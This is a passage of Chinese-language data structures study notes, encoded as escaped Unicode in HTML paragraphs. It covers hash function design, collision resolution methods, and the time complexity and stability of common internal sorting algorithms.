<p>\u6570\u5b57\u5206\u6790\u6cd5\u3002\u5bf9\u5173\u952e\u5b57\u8fdb\u884c\u5206\u6790\uff0c\u53d6\u5173\u952e\u5b57\u7684\u82e5\u5e72\u4f4d\u6216\u5176\u7ec4\u5408\u4f5c\u54c8\u5e0c\u5730\u5740\u3002\u4ec5\u9002\u5408\u4e8e\uff1a\u80fd\u9884\u5148\u4f30\u8ba1\u51fa\u5168\u4f53\u5173\u952e\u5b57\u7684\u6bcf\u4e00\u4f4d\u4e0a\u5404\u79cd\u6570\u5b57\u51fa\u73b0\u7684\u9891\u5ea6\u3002</p> <p>\u5e73\u65b9\u53d6\u4e2d\u6cd5\u3002\u4ee5\u5173\u952e\u5b57\u7684\u5e73\u65b9\u503c\u7684\u4e2d\u95f4\u51e0\u4f4d\u4f5c\u4e3a\u5b58\u50a8\u5730\u5740\u3002</p> <p>\u6298\u53e0\u6cd5\u3002\u5c06\u5173\u952e\u5b57\u5206\u5272\u6210\u4f4d\u6570\u76f8\u540c\u7684\u51e0\u90e8\u5206\uff0c\u7136\u540e\u53d6\u8fd9\u51e0\u90e8\u5206\u7684\u53e0\u52a0\u548c\uff08\u820d\u53bb\u8fdb\u4f4d\uff09\u505a\u54c8\u5e0c\u5730\u5740\u3002\u79fb\u4f4d\u53e0\u52a0/\u95f4\u754c\u53e0\u52a0\u3002\u9002\u5408\u4e8e: \u5173\u952e\u5b57\u7684\u6570\u5b57\u4f4d\u6570\u7279\u522b\u591a\uff0c\u4e14\u6bcf\u4e00\u4f4d\u4e0a\u6570\u5b57\u5206\u5e03\u5927\u81f4\u5747\u5300\u60c5\u51b5\u3002</p> <p>\u9664\u7559\u4f59\u6570\u6cd5\u3002\u53d6\u5173\u952e\u5b57\u88ab\u67d0\u4e2a\u4e0d\u5927\u4e8e\u54c8\u5e0c\u8868\u8868\u957fm\u7684\u6570p\u9664\u540e\u6240\u5f97\u4f59\u6570\u4f5c\u54c8\u5e0c\u5730\u5740\uff0c\u5373H(key)=key%p\uff0cp&lt;=m\u3002</p> <p>\u968f\u673a\u6570\u6cd5\u3002\u53d6\u5173\u952e\u5b57\u7684\u4f2a\u968f\u673a\u51fd\u6570\u503c\u4f5c\u54c8\u5e0c\u5730\u5740\uff0c\u5373H(key)=random(key)\uff0c\u9002\u4e8e\u5173\u952e\u5b57\u957f\u5ea6\u4e0d\u7b49\u7684\u60c5\u51b5\u3002</p> <p>\u51b2\u7a81\u89e3\u51b3</p> <p>\u5f00\u653e\u5b9a\u5740\u6cd5\u3002\u5f53\u51b2\u7a81\u53d1\u751f\u65f6\uff0c\u5f62\u6210\u4e00\u4e2a\u63a2\u67e5\u5e8f\u5217\uff1b\u6cbf\u6b64\u5e8f\u5217\u9010\u4e2a\u5730\u5740\u63a2\u67e5\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a\u7a7a\u4f4d\u7f6e\uff08\u5f00\u653e\u7684\u5730\u5740\uff09\uff0c\u5c06\u53d1\u751f\u51b2\u7a81\u7684\u8bb0\u5f55\u653e\u5230\u8be5\u5730\u5740\u4e2d\u3002\u5373Hi=(H(key)+di) % m\uff0ci=1,2,\u2026\u2026k(k&lt;=m-1)\uff0cH(key)\u54c8\u5e0c\u51fd\u6570\uff0cm\u54c8\u5e0c\u8868\u957f\uff0cdi\u589e\u91cf\u5e8f\u5217\u3002\u7f3a\u70b9\uff1a\u5220\u9664\uff1a\u53ea\u80fd\u4f5c\u6807\u8bb0\uff0c\u4e0d\u80fd\u771f\u6b63\u5220\u9664\uff1b\u6ea2\u51fa\uff1b\u8f7d\u56e0\u5b50\u8fc7\u5927\u3001\u89e3\u51b3\u51b2\u7a81\u7684\u7b97\u6cd5\u9009\u62e9\u4e0d\u597d\u4f1a\u53d1\u751f\u805a\u96c6\u95ee\u9898\u3002\u8981\u6c42\u88c5\u586b\u56e0\u5b50\u03b1\u8f83\u5c0f\uff0c\u6545\u5f53\u7ed3\u70b9\u89c4\u6a21\u8f83\u5927\u65f6\u4f1a\u6d6a\u8d39\u5f88\u591a\u7a7a\u95f4\u3002 </p> <p>\u7ebf\u6027\u63a2\u6d4b\u518d\u6563\u5217\uff1adi=1\uff0c2\uff0c3\uff0c\u2026\uff0cm-1</p> <p>\u4e8c\u6b21\u63a2\u6d4b\u518d\u6563\u5217\uff1adi=12,-12,22,-22,\u2026\uff0c\u00b1k2\uff08k&lt;=m/2\uff09</p> <p>\u4f2a\u968f\u673a\u63a2\u6d4b\u518d\u6563\u5217: di\u4e3a\u4f2a\u968f\u673a\u6570\u5e8f\u5217</p> <p>\u94fe\u5730\u5740\u6cd5\uff1a\u5c06\u6240\u6709\u5173\u952e\u5b57\u4e3a\u540c\u4e49\u8bcd\u7684\u8bb0\u5f55\u5b58\u50a8\u5728\u4e00\u4e2a\u5355\u94fe\u8868\u4e2d\uff0c\u5e76\u7528\u4e00\u7ef4\u6570\u7ec4\u5b58\u653e\u5934\u6307\u9488\u3002\u62c9\u94fe\u6cd5\u4e2d\u53ef\u53d6\u03b1\u22651\uff0c\u4e14\u7ed3\u70b9\u8f83\u5927\u65f6\uff0c\u62c9\u94fe\u6cd5\u4e2d\u589e\u52a0\u7684\u6307\u9488\u57df\u53ef\u5ffd\u7565\u4e0d\u8ba1\uff0c\u56e0\u6b64\u8282\u7701\u7a7a\u95f4\u3002\u4e00\u65e6\u53d1\u751f\u51b2\u7a81\uff0c\u5728\u5f53\u524d\u4f4d\u7f6e\u7ed9\u5355\u94fe\u8868\u589e\u52a0\u7ed3\u70b9\u5c31\u884c\u3002</p> <p>\u5176\u4ed6\u65b9\u6cd5\uff1a\u518d\u54c8\u5e0c\u6cd5\u3001\u5efa\u7acb\u516c\u5171\u6ea2\u51fa\u533a</p> <p>\u5728\u7528\u62c9\u94fe\u6cd5\u6784\u9020\u7684\u6563\u5217\u8868\u4e2d\uff0c\u5220\u9664\u7ed3\u70b9\u7684\u64cd\u4f5c\u6613\u4e8e\u5b9e\u73b0\u3002\u62c9\u94fe\u6cd5\u7684\u7f3a\u70b9\u662f\uff1a\u6307\u9488\u9700\u8981\u989d\u5916\u7684\u7a7a\u95f4\uff0c\u6545\u5f53\u7ed3\u70b9\u89c4\u6a21\u8f83\u5c0f\u65f6\uff0c\u5f00\u653e\u5b9a\u5740\u6cd5\u8f83\u4e3a\u8282\u7701\u7a7a\u95f4\u3002\u7531\u4e8e\u62c9\u94fe\u6cd5\u4e2d\u5404\u94fe\u8868\u4e0a\u7684\u7ed3\u70b9\u7a7a\u95f4\u662f\u52a8\u6001\u7533\u8bf7\u7684,\u6545\u5b83\u66f4\u9002\u5408\u4e8e\u9020\u8868\u524d\u65e0\u6cd5\u786e\u5b9a\u8868\u957f\u7684\u60c5\u51b5\u3002\u62c9\u94fe\u6cd5\u89e3\u51b3\u51b2\u7a81\u65f6\uff0c\u9700\u8981\u4f7f\u7528\u6307\u9488\uff0c\u6307\u793a\u4e0b\u4e00\u4e2a\u5143\u7d20\u7684\u5b58\u50a8\u4f4d\u7f6e</p> <p>\u5f00\u54c8\u5e0c\u8868\u2013\u94fe\u5f0f\u5730\u5740\u6cd5;\u95ed\u54c8\u5e0c\u8868\u2013\u5f00\u653e\u5730\u5740\u6cd5.\u5f00\u54c8\u5e0c\u548c\u95ed\u54c8\u5e0c\u4e3b\u8981\u7684\u533a\u522b\u5728\u4e8e\uff0c\u968f\u7740\u54c8\u5e0c\u8868\u7684\u5bc6\u96c6\u5ea6\u63d0\u9ad8\uff0c\u4f7f\u7528\u95ed\u54c8\u5e0c\u65f6\uff0c\u4e0d\u4ec5\u4f1a\u4e0e\u76f8\u540c\u54c8\u5e0c\u503c\u7684\u5143\u7d20\u53d1\u751f\u51b2\u7a81\uff0c\u8fd8\u5bb9\u6613\u4e0e\u4e0d\u540c\u54c8\u5e0c\u503c\u7684\u5143\u7d20\u53d1\u751f\u51b2\u7a81\uff1b\u800c\u5f00\u54c8\u5e0c\u5219\u4e0d\u53d7\u54c8\u5e0c\u8868\u758f\u5bc6\u4e0e\u5426\u7684\u5f71\u54cd\uff0c\u59cb\u7ec8\u53ea\u4f1a\u4e0e\u76f8\u540c\u54c8\u5e0c\u503c\u7684\u5143\u7d20\u51b2\u7a81\u800c\u5df2\u3002\u6240\u4ee5\u5728\u5bc6\u96c6\u5ea6\u53d8\u5927\u7684\u54c8\u5e0c\u8868\u4e2d\u67e5\u627e\u65f6\uff0c\u663e\u7136\u5f00\u54c8\u5e0c\u7684\u5e73\u5747\u641c\u7d22\u957f\u5ea6\u4e0d\u4f1a\u589e\u957f\u3002</p> <p>\u8bbe\u6709n\u4e2a\u5173\u952e\u5b57\u5177\u6709\u76f8\u540c\u7684Hash\u51fd\u6570\u503c\uff0c\u5219\u7528\u7ebf\u6027\u63a2\u6d4b\u6cd5\u628a\u8fd9n\u4e2a\u5173\u952e\u5b57\u6620\u5c04\u5230Hash\u8868\u4e2d\u9700\u8981\u505an*(n-1)/2\u6b21\u7ebf\u6027\u63a2\u6d4b\u3002\u5982\u679c\u4f7f\u7528\u4e8c\u6b21\u63a2\u6d4b\u518d\u6563\u5217\u6cd5\u5c06\u8fd9n\u4e2a\u5173\u952e\u5b57\u5b58\u5165\u54c8\u5e0c\u8868\uff0c\u81f3\u5c11\u8981\u8fdb\u884cn*(n+1)/2\u6b21\u63a2\u6d4b</p> <p>Hash\u67e5\u627e\u6548\u7387\uff1a\u88c5\u586b\u56e0\u5b50=\u8868\u4e2d\u8bb0\u5f55\u6570/\u8868\u5bb9\u91cf</p> <p>\u6709B+Tree/Hash_Map/STL Map\u4e09\u79cd\u6570\u636e\u7ed3\u6784\u3002\u5bf9\u4e8e\u5185\u5b58\u4e2d\u6570\u636e\uff0c\u67e5\u627e\u6027\u80fd\u8f83\u597d\u7684\u6570\u636e\u7ed3\u6784\u662fHash_Map\uff0c\u5bf9\u4e8e\u78c1\u76d8\u4e2d\u6570\u636e\uff0c\u67e5\u627e\u6027\u80fd\u8f83\u597d\u7684\u6570\u636e\u7ed3\u6784\u662fB+Tree\u3002Hash\u64cd\u4f5c\u80fd\u6839\u636e\u6563\u5217\u503c\u76f4\u63a5\u5b9a\u4f4d\u6570\u636e\u7684\u5b58\u50a8\u5730\u5740\uff0c\u8bbe\u8ba1\u826f\u597d\u7684hash\u8868\u80fd\u5728\u5e38\u6570\u7ea7\u65f6\u95f4\u4e0b\u627e\u5230\u9700\u8981\u7684\u6570\u636e\uff0c\u4f46\u662f\u66f4\u9002\u5408\u4e8e\u5185\u5b58\u4e2d\u7684\u67e5\u627e\u3002B+\u6811\u662f\u4e00\u79cd\u662f\u4e00\u79cd\u6811\u72b6\u7684\u6570\u636e\u7ed3\u6784\uff0c\u9002\u5408\u505a\u7d22\u5f15\uff0c\u5bf9\u78c1\u76d8\u6570\u636e\u6765\u8bf4\uff0c\u7d22\u5f15\u67e5\u627e\u662f\u6bd4\u8f83\u9ad8\u6548\u7684\u3002STL_Map\u7684\u5185\u90e8\u5b9e\u73b0\u662f\u4e00\u9897\u7ea2\u9ed1\u6811\uff0c\u4f46\u662f\u53ea\u662f\u4e00\u9897\u5728\u5185\u5b58\u4e2d\u5efa\u7acb\u4e8c\u53c9\u6811\u6811\uff0c\u4e0d\u80fd\u7528\u4e8e\u78c1\u76d8\u64cd\u4f5c\uff0c\u800c\u5176\u5185\u5b58\u67e5\u627e\u6027\u80fd\u4e5f\u6bd4\u4e0d\u4e0aHash\u67e5\u627e\u3002</p> <p>\u5185\u90e8\u6392\u5e8f</p> <p>\u5185\u90e8\u6392\u5e8f\uff1a\u5168\u90e8\u6570\u636e\u53ef\u540c\u65f6\u653e\u5165\u5185\u5b58\u8fdb\u884c\u7684\u6392\u5e8f\u3002    </p> <p>\u5916\u90e8\u6392\u5e8f\uff1a\u6587\u4ef6\u4e2d\u6570\u636e\u592a\u591a\uff0c\u65e0\u6cd5\u5168\u90e8\u8c03\u5165\u5185\u5b58\u8fdb\u884c\u7684\u6392\u5e8f\u3002</p> <p>\u63d2\u5165\u7c7b\uff1a</p> <p>\u76f4\u63a5\u63d2\u5165\u6392\u5e8f\u3002\u6700\u574f\u60c5\u51b5\u662f\u6570\u636e\u9012\u51cf\u5e8f\uff0c\u6570\u636e\u6bd4\u8f83\u548c\u79fb\u52a8\u91cf\u6700\u5927\uff0c\u8fbe\u5230O(n2)\uff0c\u6700\u597d\u662f\u6570\u636e\u662f\u9012\u589e\u5e8f\uff0c\u6bd4\u8f83\u548c\u79fb\u52a8\u6700\u5c11\u4e3aO(n)\u3002\u8d9f\u6570\u662f\u56fa\u5b9a\u7684n-1\uff0c\u5373\u4f7f\u6709\u5e8f\uff0c\u4e5f\u8981\u4f9d\u6b21\u4ece\u7b2c\u4e8c\u4e2a\u5143\u7d20\u5f00\u59cb\u3002\u6392\u5e8f\u8d9f\u6570\u4e0d\u7b49\u4e8e\u65f6\u95f4\u590d\u6742\u5ea6\u3002</p> <p>\u6298\u534a\u63d2\u5165\u6392\u5e8f \u3002\u7531\u4e8e\u63d2\u5165\u7b2ci\u4e2a\u5143\u7d20\u5230r[1]\u5230r[i-1]\u4e4b\u95f4\u65f6\uff0c\u524di\u4e2a\u6570\u636e\u662f\u6709\u5e8f\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528\u6298\u534a\u67e5\u627e\u786e\u5b9a\u63d2\u5165\u4f4d\u7f6e\uff0c\u7136\u540e\u63d2\u5165\u3002</p> <p>\u5e0c\u5c14\u6392\u5e8f\u3002\u7f29\u5c0f\u589e\u91cf\u6392\u5e8f\u30025-3-1\u3002\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u6b65\u957f\u7684\u9009\u53d6\u53ef\u7b80\u5316\u4e3a\u5f00\u59cb\u4e3a\u8868\u957fn\u7684\u4e00\u534a\uff08n/2\uff09\uff0c\u4ee5\u540e\u6bcf\u6b21\u51cf\u534a\uff0c\u6700\u540e\u4e3a1\u3002\u63d2\u5165\u7684\u6539\u8fdb\uff0c\u6700\u540e\u4e00\u8d9f\u5df2\u57fa\u672c\u6709\u5e8f\uff0c\u6bd4\u8f83\u6b21\u6570\u548c\u79fb\u52a8\u6b21\u6570\u76f8\u6bd4\u76f4\u63a5\u63d2\u5165\u6700\u540e\u4e00\u8d9f\u66f4\u5c11</p> <p>\u4ea4\u6362\u7c7b\uff1a</p> <p>\u5192\u6ce1\u6392\u5e8f\u3002O(n2)\u901a\u5e38\u8ba4\u4e3a\u5192\u6ce1\u662f\u6bd4\u8f83\u5dee\u7684\uff0c\u53ef\u4ee5\u52a0\u4e9b\u6539\u8fdb\uff0c\u6bd4\u5982\u5728\u4e00\u8d9f\u4e2d\u65e0\u6570\u636e\u7684\u4ea4\u6362\uff0c\u5219\u7ed3\u675f\u7b49\u63aa\u65bd\u3002 </p> <p>\u5728\u6570\u636e\u5df2\u57fa\u672c\u6709\u5e8f\u65f6\uff0c\u5192\u6ce1\u662f\u4e00\u4e2a\u8f83\u597d\u7684\u65b9\u6cd5</p> <p>\u5728\u6570\u636e\u91cf\u8f83\u5c11\u65f6\uff0815\u4e2a\u5de6\u53f3\uff09\u53ef\u4ee5\u7528\u5192\u6ce1</p> <p>\u5feb\u901f\u6392\u5e8f\u3002 </p> <p>\u65f6\u95f4\u590d\u6742\u5ea6\u3002\u6700\u597d\u60c5\u51b5\uff1a\u6bcf\u6b21\u652f\u70b9\u603b\u5728\u4e2d\u95f4\uff0cO(nlog2n)\uff0c\u5e73\u5747O(nlog2n)\u3002\u6700\u574f\uff0c\u6570\u636e\u5df2\u662f\u9012\u589e\u6216\u9012\u51cf\uff0cO(n2)\u3002pivotkey\u7684\u9009\u62e9\u8d8a\u9760\u8fd1\u4e2d\u592e\uff0c\u5373\u5de6\u53f3\u4e24\u4e2a\u5b50\u5e8f\u5217\u957f\u5ea6\u8d8a\u63a5\u8fd1\uff0c\u6392\u5e8f\u901f\u5ea6\u8d8a\u5feb\u3002\u8d8a\u65e0\u5e8f\u8d8a\u5feb\u3002</p> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\u3002\u9700\u6808\u7a7a\u95f4\u4ee5\u5b9e\u73b0\u9012\u5f52\uff0c\u6700\u574f\u60c5\u51b5\uff1aS(n)=O(n)\uff1b\u4e00\u822c\u60c5\u51b5\uff1aS(n)=O(log2n)</p> <p>\u5728\u5e8f\u5217\u5df2\u662f\u6709\u5e8f\u7684\u60c5\u51b5\u4e0b\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u6700\u9ad8\u3002\u539f\u56e0\uff1a\u652f\u70b9\u9009\u62e9\u4e0d\u5f53\u3002\u6539\u8fdb\uff1a\u968f\u673a\u9009\u53d6\u652f\u70b9\u6216\u6700\u5de6\u3001\u6700\u53f3\u3001\u4e2d\u95f4\u4e09\u4e2a\u5143\u7d20\u4e2d\u7684\u503c\u5904\u4e8e\u4e2d\u95f4\u7684\u4f5c\u4e3a\u652f\u70b9\uff0c\u901a\u5e38\u53ef\u4ee5\u907f\u514d\u6700\u574f\u60c5\u51b5\u3002\u6240\u4ee5\uff0c\u5feb\u901f\u6392\u5e8f\u5728\u8868\u5df2\u57fa\u672c\u6709\u5e8f\u7684\u60c5\u51b5\u4e0b\u4e0d\u5408\u9002\u3002</p> <p>\u5728\u5e8f\u5217\u957f\u5ea6\u5df2\u8f83\u77ed\u65f6\uff0c\u91c7\u7528\u76f4\u63a5\u63d2\u5165\u6392\u5e8f\u3001\u8d77\u6ce1\u6392\u5e8f\u7b49\u6392\u5e8f\u65b9\u6cd5\u3002\u5e8f\u5217\u7684\u4e2a\u6570\u901a\u5e38\u53d610\u5de6\u53f3\u3002</p> <p>\u9009\u62e9\u7c7b\u6392\u5e8f\uff1a</p> <p>\u7b80\u5355\u9009\u62e9\u6392\u5e8f\u3002O(n2)\u3002\u603b\u6bd4\u8f83\u6b21\u6570n(n-1)/2\u3002</p> <p>\u5806\u6392\u5e8f\u3002\u5efa\u5806 O(n)\uff0c\u7b5b\u9009\u6392\u5e8fO(nlogn)\u3002\u627e\u51fa\u82e5\u5e72\u4e2a\u6570\u4e2d\u6700\u5927/\u6700\u5c0f\u7684\u524dK\u4e2a\u6570\uff0c\u7528\u5806\u6392\u5e8f\u662f\u6700\u597d\u3002\u5c0f\u6839\u5806\u4e2d\u6700\u5927\u7684\u6570\u4e00\u5b9a\u662f\u653e\u5728\u53f6\u5b50\u8282\u70b9\u4e0a\uff0c\u5806\u672c\u8eab\u662f\u4e2a\u5b8c\u5168\u4e8c\u53c9\u6811\uff0c\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u53f6\u5b50\u8282\u70b9\u7684\u4f4d\u7f6e\u5927\u4e8e[n/2]\u3002\u65f6\u95f4\u590d\u6742\u5ea6\u4e0d\u4f1a\u56e0\u4e3a\u5f85\u6392\u5e8f\u5e8f\u5217\u7684\u6709\u5e8f\u7a0b\u5ea6\u800c\u6539\u53d8\uff0c\u4f46\u662f\u5f85\u6392\u5e8f\u5e8f\u5217\u7684\u6709\u5e8f\u7a0b\u5ea6\u4f1a\u5f71\u54cd\u6bd4\u8f83\u6b21\u6570\u3002</p> <p>\u5f52\u5e76\u6392\u5e8f\u3002\u65f6\u95f4\uff1a\u4e0e\u8868\u957f\u6210\u6b63\u6bd4\uff0c\u82e5\u4e00\u4e2a\u8868\u8868\u957f\u662fm\uff0c\u53e6\u4e00\u4e2a\u662fn\uff0c\u5219\u65f6\u95f4\u662fO(m+n)\u3002\u5355\u72ec\u4e00\u4e2a\u6570\u7ec4\u5f52\u5e76\uff0c\u65f6\u95f4\uff1aO(nlogn)\uff0c\u7a7a\u95f4\uff1aO(n)\uff0c\u6bd4\u8f83\u6b21\u6570\u4ecb\u4e8e(nlogn)/2\u548c(nlogn)-n+1\uff0c\u8d4b\u503c\u64cd\u4f5c\u7684\u6b21\u6570\u662f(2nlogn)\u3002\u5f52\u5e76\u6392\u5e8f\u7b97\u6cd5\u6bd4\u8f83\u5360\u7528\u5185\u5b58\uff0c\u4f46\u5374\u662f\u6548\u7387\u9ad8\u4e14\u7a33\u5b9a\u7684\u6392\u5e8f\u7b97\u6cd5\u3002\u5728\u5916\u6392\u5e8f\u4e2d\u4f7f\u7528\u3002\u5f52\u5e76\u7684\u8d9f\u6570\u662flogn\u3002</p> <p>\u57fa\u6570\u6392\u5e8f\u3002\u5728\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6bcf\u4e2a\u7ed3\u70b9\u6709 d \u4f4d\u5173\u952e\u5b57\uff0c\u5fc5\u987b\u6267\u884c t = d\u6b21\u5206\u914d\u548c\u6536\u96c6\u64cd\u4f5c\u3002\u5206\u914d\u7684\u4ee3\u4ef7\uff1aO(n)\uff1b\u6536\u96c6\u7684\u4ee3\u4ef7\uff1aO(rd) \uff08rd\u662f\u57fa\u6570\uff09\uff1b\u603b\u7684\u4ee3\u4ef7\u4e3a\uff1aO( d \u00d7(n + rd))\u3002\u9002\u7528\u4e8e\u4ee5\u6570\u5b57\u548c\u5b57\u7b26\u4e32\u4e3a\u5173\u952e\u5b57\u7684\u60c5\u51b5\u3002</p> <p>\u679a\u4e3e\u6392\u5e8f\uff0c\u901a\u5e38\u4e5f\u88ab\u53eb\u505a\u79e9\u6392\u5e8f\uff0c\u6bd4\u8f83\u8ba1\u6570\u6392\u5e8f\u3002\u5bf9\u6bcf\u4e00\u4e2a\u8981\u6392\u5e8f\u7684\u5143\u7d20\uff0c\u7edf\u8ba1\u5c0f\u4e8e\u5b83\u7684\u6240\u6709\u5143\u7d20\u7684\u4e2a\u6570\uff0c\u4ece\u800c\u5f97\u5230\u8be5\u5143\u7d20\u5728\u6574\u4e2a\u5e8f\u5217\u4e2d\u7684\u4f4d\u7f6e\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(n2)</p> <p>\u6bd4\u8f83\u6cd5\u5206\u7c7b\u7684\u4e0b\u754c\uff1aO(nlogn)</p> <p>\u6392\u5e8f\u7b97\u6cd5\u7684\u4e00\u4e9b\u7279\u70b9\uff1a</p> <p>\u5806\u6392\u5e8f\u3001\u5192\u6ce1\u6392\u5e8f\u3001\u5feb\u901f\u6392\u5e8f\u5728\u6bcf\u8d9f\u6392\u5e8f\u8fc7\u7a0b\u4e2d,\u90fd\u4f1a\u6709\u4e00\u4e2a\u5143\u7d20\u88ab\u653e\u7f6e\u5728\u5176\u6700\u7ec8\u7684\u4f4d\u7f6e\u4e0a\u3002</p> <p>\u6709\u5b57\u7b26\u5e8f\u5217 \uff5bQ,H,C,Y,P,A,M,S,R,D,F,X\uff5d ,\u65b0\u5e8f\u5217{F,H,C,D,P,A,M,Q,R,S,Y,X}\uff0c\u662f\u5feb\u901f\u6392\u5e8f\u7b97\u6cd5\u4e00\u8d9f\u626b\u63cf\u7684\u7ed3\u679c\u3002(\u62ffQ\u4f5c\u4e3a\u5206\u5272\u70b9,\u5feb\u901f\u6392\u5e8f\u4e00\u8f6e\u3002\u4e8c\u8def\u5f52\u5e76\uff0c\u7b2c\u4e00\u8d9f\u6392\u5e8f\uff0c\u5f97\u5230 n / 2 \u4e2a\u957f\u5ea6\u4e3a 2 \u7684\u5404\u81ea\u6709\u5e8f\u7684\u5b50\u5e8f\u5217\uff0c\u7b2c\u4e8c\u8d9f\u6392\u5e8f\uff0c\u5f97\u5230 n / 4 \u4e2a\u957f\u5ea6\u4e3a 4 \u7684\u5404\u81ea\u6709\u5e8f\u7684\u5b50\u5e8f\u5217H Q C Y A P M S D R F X\u3002\u5982\u679c\u662f\u5feb\u901f\u6392\u5e8f\u7684\u8bdd\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20t\u5c06\u4f1a\u88ab\u653e\u5230\u4e00\u4e2a\u6700\u51c6\u786e\u7684\u4f4d\u7f6e\uff0ct\u524d\u7684\u6570\u5747\u5c0f\u4e8et\uff0c\u540e\u9762\u7684\u6570\u5747\u5927\u4e8et\u3002\u5e0c\u5c14\u6392\u5e8f\u6bcf\u4e2a\u5c0f\u5206\u7ec4\u5185\u5c06\u4f1a\u662f\u6709\u5e8f\u7684\u3002\u5806\u6392\u5e8f\uff0c\u628a\u5b83\u6784\u6210\u4e00\u9897\u4e8c\u53c9\u6811\u7684\u65f6\u5019\uff0c\u8be5\u5806\u8981\u4e48\u5c31\u662f\u5927\u6839\u5806\uff0c\u8981\u4e48\u5c31\u662f\u5c0f\u6839\u5806\uff0c\u7b2c\u4e00\u8d9fY\u6392\u5728\u6700\u540e\uff1b\u5192\u6ce1\uff0c\u90a3\u4e48\u80af\u5b9a\u4f1a\u6709\u6570\u636e\u4e0b\u6c89\u7684\u52a8\u4f5c\uff0c\u7b2c\u4e00\u8d9f\u6709A\u5728\u7b2c\u4e00\u4f4d\u3002)</p> <p>\u5728\u6587\u4ef6\u201d\u5c40\u90e8\u6709\u5e8f\u201d\u6216\u6587\u4ef6\u957f\u5ea6\u8f83\u5c0f\u7684\u60c5\u51b5\u4e0b,\u6700\u4f73\u5185\u90e8\u6392\u5e8f\u7684\u65b9\u6cd5\u662f\u76f4\u63a5\u63d2\u5165\u6392\u5e8f\u3002\uff08\u5f52\u5e76\u6392\u5e8f\u8981\u6c42\u5f85\u6392\u5e8f\u5217\u5df2\u7ecf\u90e8\u5206\u6709\u5e8f\uff0c\u800c\u90e8\u5206\u6709\u5e8f\u7684\u542b\u4e49\u662f\u5f85\u6392\u5e8f\u5217\u7531\u82e5\u5e72\u6709\u5e8f\u7684\u5b50\u5e8f\u5217\u7ec4\u6210\uff0c\u5373\u6bcf\u4e2a\u5b50\u5e8f\u5217\u5fc5\u987b\u6709\u5e8f\uff0c\u5e76\u4e14\u5176\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(nlog2n)\uff1b\u76f4\u63a5\u63d2\u5165\u6392\u5e8f\u5728\u5f85\u6392\u5e8f\u5217\u57fa\u672c\u6709\u5e8f\u65f6\uff0c\u6bcf\u8d9f\u7684\u6bd4\u8f83\u6b21\u6570\u5927\u4e3a\u964d\u4f4e\uff0c\u5373n-1\u8d9f\u6bd4\u8f83\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u7531O(n^2)\u964d\u81f3O(n)\u3002\u5728\u5f85\u6392\u5e8f\u7684\u5143\u7d20\u5e8f\u5217\u57fa\u672c\u6709\u5e8f\u6216\u8005\u6bcf\u4e2a\u5143\u7d20\u8ddd\u5176\u6700\u7ec8\u4f4d\u7f6e\u4e0d\u8fdc\u4e5f\u53ef\u7528\u63d2\u5165\u6392\u5e8f\uff0c\u6548\u7387\u6700\u9ad8\u7684\u6392\u5e8f\u65b9\u6cd5\u662f\u63d2\u5165\u6392\u5e8f\uff09</p> <p>\u6392\u5e8f\u8d9f\u6570\u4e0e\u5e8f\u5217\u7684\u539f\u59cb\u72b6\u6001\u6709\u5173\u7684\u6392\u5e8f\u65b9\u6cd5\u662f\u4f18\u5316\u5192\u6ce1\u548c\u5feb\u901f\u6392\u5e8f\u6cd5\u3002(\u63d2\u5165\u6392\u5e8f\u548c\u9009\u62e9\u6392\u5e8f\u4e0d\u7ba1\u5e8f\u5217\u7684\u539f\u59cb\u72b6\u6001\u662f\u4ec0\u4e48\u90fd\u8981\u6267\u884cn-1\u8d9f\uff0c\u4f18\u5316\u5192\u6ce1\u548c\u5feb\u6392\u4e0d\u4e00\u5b9a\u3002\u4ed4\u7ec6\u7406\u89e3\u6392\u5e8f\u7684\u6b21\u6570\u548c\u6bd4\u8f83\u6b21\u6570\u7684\u533a\u522b)</p> <p>\u4e0d\u7a33\u5b9a\u7684\u6392\u5e8f\u65b9\u6cd5\uff1a\u5feb\u6392\uff0c\u5806\u6392\uff0c\u5e0c\u5c14\uff0c\u9009\u62e9</p> <p>\u8981\u4e0e\u5173\u952e\u5b57\u7684\u521d\u59cb\u6392\u5217\u6b21\u5e8f\u65e0\u5173,\u90a3\u4e48\u5c31\u662f\u6700\u597d\u3001\u6700\u574f\u3001\u4e00\u822c\u7684\u60c5\u51b5\u4e0b\u6392\u5e8f\u65f6\u95f4\u590d\u6742\u5ea6\u4e0d\u53d8, \u603b\u5171\u6709\u5806\u6392\u5e8f,\u5f52\u5e76\u6392\u5e8f,\u9009\u62e9\u6392\u5e8f,\u57fa\u6570\u6392\u5e8f</p> <p>\u5feb\u901f\u6392\u5e8f\u3001Shell \u6392\u5e8f\u3001\u5f52\u5e76\u6392\u5e8f\u3001\u76f4\u63a5\u63d2\u5165\u6392\u5e8f\u7684\u5173\u952e\u7801\u6bd4\u8f83\u6b21\u6570\u4e0e\u8bb0\u5f55\u7684\u521d\u59cb\u6392\u5217\u6709\u5173\u3002\u6298\u534a\u63d2\u5165\u6392\u5e8f\u3001\u9009\u62e9\u6392\u5e8f\u65e0\u5173\u3002(\u76f4\u63a5\u63d2\u5165\u6392\u5e8f\u5728\u5b8c\u5168\u6709\u5e8f\u7684\u60c5\u51b5\u4e0b\u6bcf\u4e2a\u5143\u7d20\u53ea\u9700\u8981\u4e0e\u4ed6\u5de6\u8fb9\u7684\u5143\u7d20\u6bd4\u8f83\u4e00\u6b21\u5c31\u53ef\u4ee5\u786e\u5b9a\u4ed6\u6700\u7ec8\u7684\u4f4d\u7f6e\uff1b\u6298\u534a\u63d2\u5165\u6392\u5e8f\uff0c\u6bd4\u8f83\u6b21\u6570\u662f\u56fa\u5b9a\u7684\uff0c\u4e0e\u521d\u59cb\u6392\u5e8f\u65e0\u5173\uff1b\u5feb\u901f\u6392\u5e8f\uff0c\u521d\u59cb\u6392\u5e8f\u4e0d\u5f71\u54cd\u6bcf\u6b21\u5212\u5206\u65f6\u7684\u6bd4\u8f83\u6b21\u6570\uff0c\u90fd\u8981\u6bd4\u8f83n\u6b21\uff0c\u4f46\u662f\u521d\u59cb\u6392